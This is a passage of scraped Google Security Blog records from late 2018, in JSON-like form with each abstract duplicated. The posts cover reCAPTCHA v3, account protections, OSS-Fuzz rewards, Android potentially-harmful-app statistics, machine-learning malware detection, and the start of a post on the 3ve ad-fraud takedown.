reCAPTCHA v3 will provide you with a score that tells you how suspicious an interaction is. There are three potential ways you can use the score. First, you can set a threshold that determines when a user is let through or when further verification needs to be done, for example, using two-factor authentication and phone verification. Second, you can combine the score with your own signals that reCAPTCHA can’t access—such as user profiles or transaction histories. Third, you can use the reCAPTCHA score as one of the signals to train your machine learning model to fight abuse. By providing you with these new ways to customize the actions that occur for different types of traffic, this new version lets you protect your site against bots and improve your user experience based on your website’s specific needs.  In short, reCAPTCHA v3 helps to protect your sites without user friction and gives you more power to decide what to do in risky situations. As always, we are working every day to stay ahead of attackers and keep the Internet easy and safe to use (except for bots).  Ready to get started with reCAPTCHA v3? Visit our developer site for more details.     ", "date": "October 29, 2018"},
{"website": "Google-Security", "title": "\nAnnouncing some security treats to protect you from attackers’ tricks\n", "author": ["Posted by Jonathan Skelker, Product Manager"], "link": "https://security.googleblog.com/2018/10/announcing-some-security-treats-to.html", "abstract": "                             Posted by Jonathan Skelker, Product Manager     It&#8217;s Halloween 🎃 and the last day of Cybersecurity Awareness Month 🔐, so we&#8217;re celebrating these occasions with security improvements across your account journey: before you sign in, as soon as you&#8217;ve entered your account, when you share information with other apps and sites, and the rare event in which your account is compromised.    We&#8217;re constantly protecting your information from attackers&#8217; tricks, and with these new protections and tools, we hope you can spend your Halloween worrying about zombies, witches, and your candy loot&#8212;not the security of your account.     Protecting you before you even sign in   Everyone does their best to keep their username and password safe, but sometimes bad actors may still get them through phishing or other tricks. Even when this happens, we will still protect you with safeguards that kick-in before you are signed into your account.    When your username and password are entered on Google&#8217;s sign-in page, we&#8217;ll run a risk assessment and only allow the sign-in if nothing looks suspicious. We&#8217;re always working to improve this analysis, and we&#8217;ll now require that JavaScript is enabled on the Google sign-in page, without which we can&#8217;t run this assessment.              Chances are, JavaScript is already enabled in your browser; it helps power lots of the websites people use everyday. But, because it may save bandwidth or help pages load more quickly, a tiny minority of our users (0.1%) choose to keep it off. This might make sense if you are reading static content, but we recommend that you keep Javascript on while signing into your  Google Account  so we can better protect you. You can read more about how to enable JavaScript  here .                       Keeping your Google Account secure while you&#8217;re signed in            Last year, we  launched a major update  to the  Security Checkup  that upgraded it from the same checklist for everyone, to a smarter tool that automatically provides personalized guidance for improving the security of your Google Account.         We&#8217;re adding to this advice all the time. Most recently, we introduced better protection against harmful apps based on recommendations from  Google Play Protect , as well as the ability to remove your account from any devices you no longer use.                    More notifications when you share your account data with apps and sites            It&#8217;s really important that you understand the information that has been shared with apps or sites so that we can keep you safe. We already notify you when you&#8217;ve granted access to sensitive information &#8212; like Gmail data or your Google Contacts &#8212; to third-party sites or apps, and in the next few weeks, we&#8217;ll expand this to notify you whenever you share any data from your Google Account. You can always see which apps have access to your data in the  Security Checkup .                       Helping you get back to the beginning if you run into trouble            In the rare event that your account is compromised, our priority is to help get you back to safety as quickly as possible. We&#8217;ve introduced a new, step-by-step  process  within your Google Account that we will automatically trigger if we detect potential unauthorized activity.         We'll help you:          Verify critical security settings  to help ensure your account isn&#8217;t vulnerable to additional attacks and that someone can&#8217;t access it via other means, like a recovery phone number or email address.    Secure your other accounts  because your Google Account might be a gateway to accounts on other services and a hijacking can leave those vulnerable as well.    Check financial activity  to see if any payment methods connected to your account, like a credit card or Google Pay, were abused.    Review content and files  to see if any of your Gmail or Drive data was accessed or mis-used.                 Online security can sometimes feel like walking through a haunted house&#8212;scary, and you aren't quite sure what may pop up. We are constantly working to strengthen our automatic protections to stop attackers and keep you safe you from the many tricks you may encounter. During Cybersecurity Month, and beyond, we've got your back.                                     Posted by Jonathan Skelker, Product Manager  It’s Halloween 🎃 and the last day of Cybersecurity Awareness Month 🔐, so we’re celebrating these occasions with security improvements across your account journey: before you sign in, as soon as you’ve entered your account, when you share information with other apps and sites, and the rare event in which your account is compromised.  We’re constantly protecting your information from attackers’ tricks, and with these new protections and tools, we hope you can spend your Halloween worrying about zombies, witches, and your candy loot—not the security of your account.  Protecting you before you even sign in Everyone does their best to keep their username and password safe, but sometimes bad actors may still get them through phishing or other tricks. Even when this happens, we will still protect you with safeguards that kick-in before you are signed into your account.  When your username and password are entered on Google’s sign-in page, we’ll run a risk assessment and only allow the sign-in if nothing looks suspicious. We’re always working to improve this analysis, and we’ll now require that JavaScript is enabled on the Google sign-in page, without which we can’t run this assessment.       Chances are, JavaScript is already enabled in your browser; it helps power lots of the websites people use everyday. But, because it may save bandwidth or help pages load more quickly, a tiny minority of our users (0.1%) choose to keep it off. This might make sense if you are reading static content, but we recommend that you keep Javascript on while signing into your Google Account so we can better protect you. You can read more about how to enable JavaScript here.        Keeping your Google Account secure while you’re signed in    Last year, we launched a major update to the Security Checkup that upgraded it from the same checklist for everyone, to a smarter tool that automatically provides personalized guidance for improving the security of your Google Account.    We’re adding to this advice all the time. Most recently, we introduced better protection against harmful apps based on recommendations from Google Play Protect, as well as the ability to remove your account from any devices you no longer use.        More notifications when you share your account data with apps and sites    It’s really important that you understand the information that has been shared with apps or sites so that we can keep you safe. We already notify you when you’ve granted access to sensitive information — like Gmail data or your Google Contacts — to third-party sites or apps, and in the next few weeks, we’ll expand this to notify you whenever you share any data from your Google Account. You can always see which apps have access to your data in the Security Checkup.        Helping you get back to the beginning if you run into trouble    In the rare event that your account is compromised, our priority is to help get you back to safety as quickly as possible. We’ve introduced a new, step-by-step process within your Google Account that we will automatically trigger if we detect potential unauthorized activity.    We'll help you:    Verify critical security settings to help ensure your account isn’t vulnerable to additional attacks and that someone can’t access it via other means, like a recovery phone number or email address. Secure your other accounts because your Google Account might be a gateway to accounts on other services and a hijacking can leave those vulnerable as well. Check financial activity to see if any payment methods connected to your account, like a credit card or Google Pay, were abused. Review content and files to see if any of your Gmail or Drive data was accessed or mis-used.       Online security can sometimes feel like walking through a haunted house—scary, and you aren't quite sure what may pop up. We are constantly working to strengthen our automatic protections to stop attackers and keep you safe you from the many tricks you may encounter. During Cybersecurity Month, and beyond, we've got your back.     ", "date": "October 31, 2018"},
{"website": "Google-Security", "title": "\nA New Chapter for OSS-Fuzz\n", "author": ["Posted by Matt Ruhstaller, TPM and Oliver Chang, Software Engineer, Google Security Team"], "link": "https://security.googleblog.com/2018/11/a-new-chapter-for-oss-fuzz.html", "abstract": "                             Posted by Matt Ruhstaller, TPM and Oliver Chang, Software Engineer, Google Security Team     Open Source Software (OSS) is extremely important to Google, and we rely on OSS in a variety of customer-facing and internal projects. We also understand the difficulty and importance of securing the open source ecosystem, and are continuously looking for ways to simplify it.    For the OSS community, we currently provide  OSS-Fuzz , a free continuous fuzzing infrastructure hosted on the  Google Cloud Platform . OSS-Fuzz uncovers security vulnerabilities and stability issues, and reports them directly to developers. Since  launching  in December 2016, OSS-Fuzz has reported over  9,000  bugs directly to open source developers.    In addition to OSS-Fuzz, Google's security team maintains several internal tools for identifying bugs in both Google internal and Open Source code. Until recently, these issues were  manually reported  to various public bug trackers by our security team and then monitored until they were  resolved . Unresolved bugs were eligible for the  Patch Rewards Program . While this reporting process had some success, it was overly complex. Now, by unifying and automating our fuzzing tools, we have been able to consolidate our processes into a single workflow, based on OSS-Fuzz. Projects integrated with OSS-Fuzz will benefit from being reviewed by both our internal and external fuzzing tools, thereby increasing code coverage and discovering bugs faster.    We are committed to helping open source projects benefit from integrating with our OSS-Fuzz fuzzing infrastructure. In the coming weeks, we will reach out via email to critical projects that we believe would be a good fit and support the community at large. Projects that integrate are eligible for rewards ranging from $1,000 (initial integration) up to $20,000 ( ideal integration ); more details are available  here . These rewards are intended to help offset the cost and effort required to properly configure fuzzing for OSS projects. If you would like to integrate your project with OSS-Fuzz, please submit your project for  review .  Our goal is to admit as many OSS projects as possible and ensure that they are continuously fuzzed.       Once contacted, we might provide a sample  fuzz target  to you for easy integration. Many of these fuzz targets are generated with new technology that understands how library APIs are used appropriately. Watch this space for more details on how Google plans to further automate fuzz target creation, so that even more open source projects can benefit from continuous fuzzing.    Thank you for your continued contributions to the Open Source community. Let&#8217;s work together on a more secure and stable future for Open Source Software.                                   Posted by Matt Ruhstaller, TPM and Oliver Chang, Software Engineer, Google Security Team  Open Source Software (OSS) is extremely important to Google, and we rely on OSS in a variety of customer-facing and internal projects. We also understand the difficulty and importance of securing the open source ecosystem, and are continuously looking for ways to simplify it.  For the OSS community, we currently provide OSS-Fuzz, a free continuous fuzzing infrastructure hosted on the Google Cloud Platform. OSS-Fuzz uncovers security vulnerabilities and stability issues, and reports them directly to developers. Since launching in December 2016, OSS-Fuzz has reported over 9,000 bugs directly to open source developers.  In addition to OSS-Fuzz, Google's security team maintains several internal tools for identifying bugs in both Google internal and Open Source code. Until recently, these issues were manually reported to various public bug trackers by our security team and then monitored until they were resolved. Unresolved bugs were eligible for the Patch Rewards Program. While this reporting process had some success, it was overly complex. Now, by unifying and automating our fuzzing tools, we have been able to consolidate our processes into a single workflow, based on OSS-Fuzz. Projects integrated with OSS-Fuzz will benefit from being reviewed by both our internal and external fuzzing tools, thereby increasing code coverage and discovering bugs faster.  We are committed to helping open source projects benefit from integrating with our OSS-Fuzz fuzzing infrastructure. In the coming weeks, we will reach out via email to critical projects that we believe would be a good fit and support the community at large. Projects that integrate are eligible for rewards ranging from $1,000 (initial integration) up to $20,000 (ideal integration); more details are available here. These rewards are intended to help offset the cost and effort required to properly configure fuzzing for OSS projects. If you would like to integrate your project with OSS-Fuzz, please submit your project for review. Our goal is to admit as many OSS projects as possible and ensure that they are continuously fuzzed.  Once contacted, we might provide a sample fuzz target to you for easy integration. Many of these fuzz targets are generated with new technology that understands how library APIs are used appropriately. Watch this space for more details on how Google plans to further automate fuzz target creation, so that even more open source projects can benefit from continuous fuzzing.  Thank you for your continued contributions to the Open Source community. Let’s work together on a more secure and stable future for Open Source Software.     ", "date": "November 6, 2018"},
{"website": "Google-Security", "title": "\nIntroducing the Android Ecosystem Security Transparency Report\n", "author": ["Posted by Jason Woloz and Eugene Liderman, Android Security & Privacy Team"], "link": "https://security.googleblog.com/2018/11/introducing-android-ecosystem-security.html", "abstract": "                             Posted by Jason Woloz and Eugene Liderman, Android Security &amp; Privacy Team      Update: We identified a bug that affected how we calculated data from Q3 2018 in the Transparency Report. This bug created inconsistencies between the data in the report and this blog post. The data points in this blog post have been corrected.     As shared during the  What's new in Android security  session at Google I/O 2018, transparency and openness are important parts of Android's ethos. We regularly blog about new features and enhancements and publish an  annual Android Security Year in Review , which highlights Android ecosystem trends. To provide more frequent insights, we're introducing a quarterly  Android Ecosystem Security Transparency Report . This report is the latest addition to our  Transparency Report  site, which began in 2010 to show how the policies and actions of governments and corporations affect privacy, security, and access to information online.    This Android Ecosystem Security Transparency Report covers how often a routine, full-device scan by  Google Play Protect  detects a device with PHAs installed. Google Play Protect is built-in protection on Android devices that scans over 50 billion apps daily from inside and outside of Google Play. These scans look for evidence of  Potentially Harmful Applications  (PHAs). If the scans find a PHA, Google Play Protect warns the user and can disable or remove PHAs. In Android's first annual Android Security Year in Review from 2014, fewer than 1% of devices had PHAs installed. The percentage has declined steadily over time and this downward trend continues through 2018. The transparency report covers PHA rates in three areas: market segment (whether a PHA came from Google Play or outside of Google Play), Android version, and country.     Devices with Potentially Harmful Applications installed by market segment       Google works hard to protect your Android device: no matter where your apps come from. Continuing the trend from previous years, Android devices that only download apps from Google Play are 9 times less likely to get a PHA than devices that download apps from other sources. Before applications become available in Google Play they undergo an application review to confirm they comply with Google Play policies. Google uses a risk scorer to analyze apps to detect potentially harmful behavior. When Google&#8217;s application risk analyzer discovers something suspicious, it flags the app and refers the PHA to a security analyst for manual review if needed. We also scan apps that users download to their device from outside of Google Play. If we find a suspicious app, we also protect users from that&#8212;even if it didn't come from Google Play.    In the Android Ecosystem Security Transparency Report, the Devices with Potentially Harmful Applications installed by market segment chart shows the percentage of Android devices that have one or more PHAs installed over time. The chart has two lines: PHA rate for devices that exclusively install from Google Play and PHA rate for devices that also install from outside of Google Play. In 2017, on average 0.09% of devices that exclusively used Google Play had one or more PHAs installed. The first three quarters in 2018 averaged a lower PHA rate of 0.08%.    The security of devices that installed apps from outside of Google Play also improved. In 2017, ~0.82% of devices that installed apps from outside of Google Play were affected by PHA; in the first three quarters of 2018, ~0.68% were affected. Since 2017, we've reduced this number by expanding the auto-disable feature which we covered on page 10 in the  2017 Year in Review . While malware rates fluctuate from quarter to quarter, our metrics continue to show a consistent downward trend over time. We'll share more details in our 2018 Android Security Year in Review in early 2019.     Devices with Potentially Harmful Applications installed by Android version       Newer versions of Android are less affected by PHAs. We attribute this to many factors, such as continued platform and API hardening, ongoing security updates and app security and developer training to reduce apps' access to sensitive data. In particular, newer Android versions&#8212;such as Nougat, Oreo, and Pie&#8212;are more resilient to privilege escalation attacks that had previously allowed PHAs to gain persistence on devices and protect themselves against removal attempts. The Devices with Potentially Harmful Applications installed by Android version chart shows the percentage of devices with a PHA installed, sorted by the Android version that the device is running.     Devices with Potentially Harmful Applications rate by top 10 countries       Overall, PHA rates in the ten largest Android markets have remained steady. While these numbers fluctuate on a quarterly basis due to the fluidity of the marketplace, we intend to provide more in depth coverage of what drove these changes in our annual  Year in Review  in Q1, 2019.    The  Devices with Potentially Harmful Applications rate by top 10 countries  chart shows the percentage of devices with at least one PHA in the ten countries with the highest volume of Android devices. India saw the most significant decline in PHAs present on devices, with the average rate of infection dropping by 34 percent. Indonesia, Mexico, and Turkey also saw a decline in the likelihood of PHAs being present on devices in the region. South Korea saw the lowest number of devices containing PHA, with only 0.1%.     Check out the report       Over time, we'll add more insights into the health of the ecosystem to the  Android Ecosystem Security Transparency Report . If you have any questions about terminology or the products referred to in this report please review the  FAQs section of the Transparency Report . In the meantime, check out our new  blog post  and  video  outlining Android&#8217;s performance in Gartner&#8217;s Mobile OSs and Device Security: A Comparison of Platforms report.                                   Posted by Jason Woloz and Eugene Liderman, Android Security & Privacy Team  Update: We identified a bug that affected how we calculated data from Q3 2018 in the Transparency Report. This bug created inconsistencies between the data in the report and this blog post. The data points in this blog post have been corrected.  As shared during the What's new in Android security session at Google I/O 2018, transparency and openness are important parts of Android's ethos. We regularly blog about new features and enhancements and publish an annual Android Security Year in Review, which highlights Android ecosystem trends. To provide more frequent insights, we're introducing a quarterly Android Ecosystem Security Transparency Report. This report is the latest addition to our Transparency Report site, which began in 2010 to show how the policies and actions of governments and corporations affect privacy, security, and access to information online.  This Android Ecosystem Security Transparency Report covers how often a routine, full-device scan by Google Play Protect detects a device with PHAs installed. Google Play Protect is built-in protection on Android devices that scans over 50 billion apps daily from inside and outside of Google Play. These scans look for evidence of Potentially Harmful Applications (PHAs). If the scans find a PHA, Google Play Protect warns the user and can disable or remove PHAs. In Android's first annual Android Security Year in Review from 2014, fewer than 1% of devices had PHAs installed. The percentage has declined steadily over time and this downward trend continues through 2018. The transparency report covers PHA rates in three areas: market segment (whether a PHA came from Google Play or outside of Google Play), Android version, and country.  Devices with Potentially Harmful Applications installed by market segment  Google works hard to protect your Android device: no matter where your apps come from. Continuing the trend from previous years, Android devices that only download apps from Google Play are 9 times less likely to get a PHA than devices that download apps from other sources. Before applications become available in Google Play they undergo an application review to confirm they comply with Google Play policies. Google uses a risk scorer to analyze apps to detect potentially harmful behavior. When Google’s application risk analyzer discovers something suspicious, it flags the app and refers the PHA to a security analyst for manual review if needed. We also scan apps that users download to their device from outside of Google Play. If we find a suspicious app, we also protect users from that—even if it didn't come from Google Play.  In the Android Ecosystem Security Transparency Report, the Devices with Potentially Harmful Applications installed by market segment chart shows the percentage of Android devices that have one or more PHAs installed over time. The chart has two lines: PHA rate for devices that exclusively install from Google Play and PHA rate for devices that also install from outside of Google Play. In 2017, on average 0.09% of devices that exclusively used Google Play had one or more PHAs installed. The first three quarters in 2018 averaged a lower PHA rate of 0.08%.  The security of devices that installed apps from outside of Google Play also improved. In 2017, ~0.82% of devices that installed apps from outside of Google Play were affected by PHA; in the first three quarters of 2018, ~0.68% were affected. Since 2017, we've reduced this number by expanding the auto-disable feature which we covered on page 10 in the 2017 Year in Review. While malware rates fluctuate from quarter to quarter, our metrics continue to show a consistent downward trend over time. We'll share more details in our 2018 Android Security Year in Review in early 2019.  Devices with Potentially Harmful Applications installed by Android version  Newer versions of Android are less affected by PHAs. We attribute this to many factors, such as continued platform and API hardening, ongoing security updates and app security and developer training to reduce apps' access to sensitive data. In particular, newer Android versions—such as Nougat, Oreo, and Pie—are more resilient to privilege escalation attacks that had previously allowed PHAs to gain persistence on devices and protect themselves against removal attempts. The Devices with Potentially Harmful Applications installed by Android version chart shows the percentage of devices with a PHA installed, sorted by the Android version that the device is running.  Devices with Potentially Harmful Applications rate by top 10 countries  Overall, PHA rates in the ten largest Android markets have remained steady. While these numbers fluctuate on a quarterly basis due to the fluidity of the marketplace, we intend to provide more in depth coverage of what drove these changes in our annual Year in Review in Q1, 2019.  The Devices with Potentially Harmful Applications rate by top 10 countries chart shows the percentage of devices with at least one PHA in the ten countries with the highest volume of Android devices. India saw the most significant decline in PHAs present on devices, with the average rate of infection dropping by 34 percent. Indonesia, Mexico, and Turkey also saw a decline in the likelihood of PHAs being present on devices in the region. South Korea saw the lowest number of devices containing PHA, with only 0.1%.  Check out the report  Over time, we'll add more insights into the health of the ecosystem to the Android Ecosystem Security Transparency Report. If you have any questions about terminology or the products referred to in this report please review the FAQs section of the Transparency Report. In the meantime, check out our new blog post and video outlining Android’s performance in Gartner’s Mobile OSs and Device Security: A Comparison of Platforms report.     ", "date": "November 8, 2018"},
{"website": "Google-Security", "title": "\nCombating Potentially Harmful Applications with Machine Learning at Google: Datasets and Models\n", "author": ["Posted by Mo Yu, Damien Octeau, and Chuangang Ren, Android Security & Privacy Team"], "link": "https://security.googleblog.com/2018/11/combating-potentially-harmful_14.html", "abstract": "                             Posted by Mo Yu, Damien Octeau, and Chuangang Ren, Android Security &amp; Privacy Team      [Cross-posted from the  Android Developers Blog ]     In a  previous blog post , we talked about using machine learning to combat  Potentially Harmful Applications (PHAs) . This blog post covers how Google uses machine learning techniques to detect and classify PHAs. We'll discuss the challenges in the PHA detection space, including the scale of data, the correct identification of PHA behaviors, and the evolution of PHA families. Next, we will introduce two of the datasets that make the training and implementation of machine learning models possible, such as app analysis data and Google Play data. Finally, we will present some of the approaches we use, including logistic regression and deep neural networks.               Using Machine Learning to Scale       Detecting PHAs is challenging and requires a lot of resources. Our security experts need to understand how apps interact with the system and the user, analyze complex signals to find  PHA behavior , and evolve their tactics to stay ahead of PHA authors. Every day,  Google Play Protect  (GPP) analyzes over half a million apps, which makes a lot of new data for our security experts to process.    Leveraging machine learning helps us detect PHAs faster and at a larger scale. We can detect more PHAs just by adding additional computing resources. In many cases, machine learning can find PHA signals in the training data without human intervention. Sometimes, those signals are different than signals found by security experts. Machine learning can take better advantage of this data, and discover hidden relationships between signals more effectively.    There are two major parts of Google Play Protect's machine learning protections: the data and the machine learning models.     Data Sources       The quality and quantity of the data used to create a model are crucial to the success of the system. For the purpose of PHA detection and classification, our system mainly uses two anonymous data sources: data from analyzing apps and data from how users experience apps.    App Data    Google Play Protect analyzes every app that it can find on the internet. We created a dataset by decomposing each app's APK and extracting PHA signals with deep analysis. We execute various processes on each app to find particular features and behaviors that are relevant to the PHA categories in scope (for example, SMS fraud, phishing, privilege escalation). Static analysis examines the different resources inside an APK file while dynamic analysis checks the behavior of the app when it's actually running. These two approaches complement each other. For example, dynamic analysis requires the execution of the app regardless of how obfuscated its code is (obfuscation hinders static analysis), and static analysis can help detect cloaking attempts in the code that may in practice bypass dynamic analysis-based detection. In the end, this analysis produces information about the app's characteristics, which serve as a fundamental data source for machine learning algorithms.    Google Play Data    In addition to analyzing each app, we also try to understand how users perceive that app. User feedback (such as the number of installs, uninstalls, user ratings, and comments) collected from Google Play can help us identify problematic apps. Similarly, information about the developer (such as the certificates they use and their history of published apps) contribute valuable knowledge that can be used to identify PHAs. All these metrics are generated when developers submit a new app (or new version of an app) and by millions of Google Play users every day. This information helps us to understand the quality, behavior, and purpose of an app so that we can identify new PHA behaviors or identify similar apps.    In general, our data sources yield raw signals, which then need to be transformed into machine learning features for use by our algorithms. Some signals, such as the permissions that an app requests, have a clear semantic meaning and can be directly used. In other cases, we need to engineer our data to make new, more powerful features. For example, we can aggregate the ratings of all apps that a particular developer owns, so we can calculate a rating per developer and use it to validate future apps. We also employ several techniques to focus in on interesting data.To create compact representations for sparse data, we use  embedding . To help streamline the data to make it more useful to models, we use  feature selection . Depending on the target, feature selection helps us keep the most relevant signals and remove irrelevant ones.    By combining our different datasets and investing in  feature engineering  and feature selection, we improve the quality of the data that can be fed to various types of machine learning models.     Models       Building a good machine learning model is like building a skyscraper: quality materials are important, but a great design is also essential. Like the materials in a skyscraper, good datasets and features are important to machine learning, but a great algorithm is essential to identify PHA behaviors effectively and efficiently.              We train models to identify PHAs that belong to a specific category, such as SMS-fraud or phishing. Such categories are quite broad and contain a large number of samples given the number of PHA families that fit the definition. Alternatively, we also have models focusing on a much smaller scale, such as a family, which is composed of a group of apps that are part of the same PHA campaign and that share similar source code and behaviors. On the one hand, having a single model to tackle an entire PHA category may be attractive in terms of simplicity but precision may be an issue as the model will have to generalize the behaviors of a large number of PHAs believed to have something in common. On the other hand, developing multiple PHA models may require additional engineering efforts, but may result in better precision at the cost of reduced scope.    We use a variety of modeling techniques to modify our machine learning approach, including supervised and unsupervised ones.    One supervised technique we use is logistic regression, which has been widely adopted in the industry. These models have a simple structure and can be trained quickly. Logistic regression models can be analyzed to understand the importance of the different PHA and app features they are built with, allowing us to improve our feature engineering process. After a few cycles of training, evaluation, and improvement, we can launch the best models in production and monitor their performance.    For more complex cases, we employ deep learning. Compared to logistic regression, deep learning is good at capturing complicated interactions between different features and extracting hidden patterns. The millions of apps in Google Play provide a rich dataset, which is advantageous to deep learning.    In addition to our targeted feature engineering efforts, we experiment with many aspects of deep neural networks. For example, a deep neural network can have multiple layers and each layer has several neurons to process signals. We can experiment with the number of layers and neurons per layer to change model behaviors.    We also adopt unsupervised machine learning methods. Many PHAs use similar abuse techniques and tricks, so they look almost identical to each other. An unsupervised approach helps define clusters of apps that look or behave similarly, which allows us to mitigate and identify PHAs more effectively. We can automate the process of categorizing that type of app if we are confident in the model or can request help from a human expert to validate what the model found.    PHAs are constantly evolving, so our models need constant updating and monitoring. In production, models are fed with data from recent apps, which help them stay relevant. However, new abuse techniques and behaviors need to be continuously detected and fed into our machine learning models to be able to catch new PHAs and stay on top of recent trends. This is a continuous cycle of model creation and updating that also requires tuning to ensure that the precision and coverage of the system as a whole matches our detection goals.     Looking forward       As part of Google's AI-first strategy, our work leverages many machine learning resources across the company, such as tools and infrastructures developed by Google Brain and Google Research. In 2017, our machine learning models  successfully detected 60.3% of PHAs identified by Google Play Protect , covering over 2 billion Android devices. We continue to research and invest in machine learning to scale and simplify the detection of PHAs in the Android ecosystem.               Acknowledgements       This work was developed in joint collaboration with Google Play Protect, Safe Browsing and Play Abuse teams with contributions from Andrew Ahn, Hrishikesh Aradhye, Daniel Bali, Hongji Bao, Yajie Hu, Arthur Kaiser, Elena Kovakina, Salvador Mandujano, Melinda Miller, Rahul Mishra, Sebastian Porst, Monirul Sharif, Sri Somanchi, Sai Deep Tetali, and Zhikun Wang.                                   Posted by Mo Yu, Damien Octeau, and Chuangang Ren, Android Security & Privacy Team  [Cross-posted from the Android Developers Blog]  In a previous blog post, we talked about using machine learning to combat Potentially Harmful Applications (PHAs). This blog post covers how Google uses machine learning techniques to detect and classify PHAs. We'll discuss the challenges in the PHA detection space, including the scale of data, the correct identification of PHA behaviors, and the evolution of PHA families. Next, we will introduce two of the datasets that make the training and implementation of machine learning models possible, such as app analysis data and Google Play data. Finally, we will present some of the approaches we use, including logistic regression and deep neural networks.     Using Machine Learning to Scale  Detecting PHAs is challenging and requires a lot of resources. Our security experts need to understand how apps interact with the system and the user, analyze complex signals to find PHA behavior, and evolve their tactics to stay ahead of PHA authors. Every day, Google Play Protect (GPP) analyzes over half a million apps, which makes a lot of new data for our security experts to process.  Leveraging machine learning helps us detect PHAs faster and at a larger scale. We can detect more PHAs just by adding additional computing resources. In many cases, machine learning can find PHA signals in the training data without human intervention. Sometimes, those signals are different than signals found by security experts. Machine learning can take better advantage of this data, and discover hidden relationships between signals more effectively.  There are two major parts of Google Play Protect's machine learning protections: the data and the machine learning models.  Data Sources  The quality and quantity of the data used to create a model are crucial to the success of the system. For the purpose of PHA detection and classification, our system mainly uses two anonymous data sources: data from analyzing apps and data from how users experience apps.  App Data  Google Play Protect analyzes every app that it can find on the internet. We created a dataset by decomposing each app's APK and extracting PHA signals with deep analysis. We execute various processes on each app to find particular features and behaviors that are relevant to the PHA categories in scope (for example, SMS fraud, phishing, privilege escalation). Static analysis examines the different resources inside an APK file while dynamic analysis checks the behavior of the app when it's actually running. These two approaches complement each other. For example, dynamic analysis requires the execution of the app regardless of how obfuscated its code is (obfuscation hinders static analysis), and static analysis can help detect cloaking attempts in the code that may in practice bypass dynamic analysis-based detection. In the end, this analysis produces information about the app's characteristics, which serve as a fundamental data source for machine learning algorithms.  Google Play Data  In addition to analyzing each app, we also try to understand how users perceive that app. User feedback (such as the number of installs, uninstalls, user ratings, and comments) collected from Google Play can help us identify problematic apps. Similarly, information about the developer (such as the certificates they use and their history of published apps) contribute valuable knowledge that can be used to identify PHAs. All these metrics are generated when developers submit a new app (or new version of an app) and by millions of Google Play users every day. This information helps us to understand the quality, behavior, and purpose of an app so that we can identify new PHA behaviors or identify similar apps.  In general, our data sources yield raw signals, which then need to be transformed into machine learning features for use by our algorithms. Some signals, such as the permissions that an app requests, have a clear semantic meaning and can be directly used. In other cases, we need to engineer our data to make new, more powerful features. For example, we can aggregate the ratings of all apps that a particular developer owns, so we can calculate a rating per developer and use it to validate future apps. We also employ several techniques to focus in on interesting data.To create compact representations for sparse data, we use embedding. To help streamline the data to make it more useful to models, we use feature selection. Depending on the target, feature selection helps us keep the most relevant signals and remove irrelevant ones.  By combining our different datasets and investing in feature engineering and feature selection, we improve the quality of the data that can be fed to various types of machine learning models.  Models  Building a good machine learning model is like building a skyscraper: quality materials are important, but a great design is also essential. Like the materials in a skyscraper, good datasets and features are important to machine learning, but a great algorithm is essential to identify PHA behaviors effectively and efficiently.     We train models to identify PHAs that belong to a specific category, such as SMS-fraud or phishing. Such categories are quite broad and contain a large number of samples given the number of PHA families that fit the definition. Alternatively, we also have models focusing on a much smaller scale, such as a family, which is composed of a group of apps that are part of the same PHA campaign and that share similar source code and behaviors. On the one hand, having a single model to tackle an entire PHA category may be attractive in terms of simplicity but precision may be an issue as the model will have to generalize the behaviors of a large number of PHAs believed to have something in common. On the other hand, developing multiple PHA models may require additional engineering efforts, but may result in better precision at the cost of reduced scope.  We use a variety of modeling techniques to modify our machine learning approach, including supervised and unsupervised ones.  One supervised technique we use is logistic regression, which has been widely adopted in the industry. These models have a simple structure and can be trained quickly. Logistic regression models can be analyzed to understand the importance of the different PHA and app features they are built with, allowing us to improve our feature engineering process. After a few cycles of training, evaluation, and improvement, we can launch the best models in production and monitor their performance.  For more complex cases, we employ deep learning. Compared to logistic regression, deep learning is good at capturing complicated interactions between different features and extracting hidden patterns. The millions of apps in Google Play provide a rich dataset, which is advantageous to deep learning.  In addition to our targeted feature engineering efforts, we experiment with many aspects of deep neural networks. For example, a deep neural network can have multiple layers and each layer has several neurons to process signals. We can experiment with the number of layers and neurons per layer to change model behaviors.  We also adopt unsupervised machine learning methods. Many PHAs use similar abuse techniques and tricks, so they look almost identical to each other. An unsupervised approach helps define clusters of apps that look or behave similarly, which allows us to mitigate and identify PHAs more effectively. We can automate the process of categorizing that type of app if we are confident in the model or can request help from a human expert to validate what the model found.  PHAs are constantly evolving, so our models need constant updating and monitoring. In production, models are fed with data from recent apps, which help them stay relevant. However, new abuse techniques and behaviors need to be continuously detected and fed into our machine learning models to be able to catch new PHAs and stay on top of recent trends. This is a continuous cycle of model creation and updating that also requires tuning to ensure that the precision and coverage of the system as a whole matches our detection goals.  Looking forward  As part of Google's AI-first strategy, our work leverages many machine learning resources across the company, such as tools and infrastructures developed by Google Brain and Google Research. In 2017, our machine learning models successfully detected 60.3% of PHAs identified by Google Play Protect, covering over 2 billion Android devices. We continue to research and invest in machine learning to scale and simplify the detection of PHAs in the Android ecosystem.     Acknowledgements  This work was developed in joint collaboration with Google Play Protect, Safe Browsing and Play Abuse teams with contributions from Andrew Ahn, Hrishikesh Aradhye, Daniel Bali, Hongji Bao, Yajie Hu, Arthur Kaiser, Elena Kovakina, Salvador Mandujano, Melinda Miller, Rahul Mishra, Sebastian Porst, Monirul Sharif, Sri Somanchi, Sai Deep Tetali, and Zhikun Wang.     ", "date": "November 15, 2018"},
{"website": "Google-Security", "title": "\nIndustry collaboration leads to takedown of the “3ve” ad fraud operation\n", "author": ["Posted by Per Bjorke, Product Manager, Ad Traffic Quality"], "link": "https://security.googleblog.com/2018/11/industry-collaboration-leads-to.html", "abstract": "                             Posted by Per Bjorke, Product Manager, Ad Traffic Quality     For years, Google has been waging a comprehensive, global fight against invalid traffic through a combination of technology, policy, and operations teams to protect advertisers and publishers and increase transparency throughout the advertising industry.    Last year, we identified one of the most complex and sophisticated ad fraud operations we have seen to date, working with cyber security firm  White Ops , and referred the case to law enforcement. Today, the U.S. Attorney&#8217;s Office for the Eastern District of New York  announced  criminal charges associated with this fraud operation. This takedown marks a major milestone in the industry&#8217;s fight against ad fraud, and we&#8217;re proud to have been a key contributor.    In partnership with White Ops, we have published a white paper about how we identified this ad fraud operation, the steps we took to protect our clients from being impacted, and the technical work we did to detect patterns across systems in the industry. Below are some of the highlights from the white paper, which you can download  here .       All about 3ve: A creative and sophisticated threat       Referred to as 3ve (pronounced &#8220;Eve&#8221;), this ad fraud operation evolved over the course of 2017 from a modest, low-level botnet into a large and sophisticated operation that used a broad set of tactics to commit ad fraud. 3ve operated on a significant 